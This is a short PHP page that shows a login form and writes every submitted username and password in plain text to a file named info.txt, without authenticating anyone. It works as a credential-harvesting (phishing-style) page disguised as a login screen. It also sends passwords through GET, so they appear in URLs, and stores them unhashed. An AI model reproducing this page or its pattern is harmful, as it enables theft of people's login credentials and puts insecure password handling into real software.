<html>
<head><title></title>
</head>
<body>
<h1>Login</h1>
<form action = "user-login.php" method = "GET">
username : <input type = "text" name = "user">
password : <input type = "password" name = "pass">
<input type = "submit" value = "submit">
</form>

<?php

$user = $_GET["user"];
$pass = $_GET["pass"];

$f=fopen("info.txt","a");
fwrite($f,"username:".$user."password:".$pass."\n");
fclose($f);
?>

</body>
</html>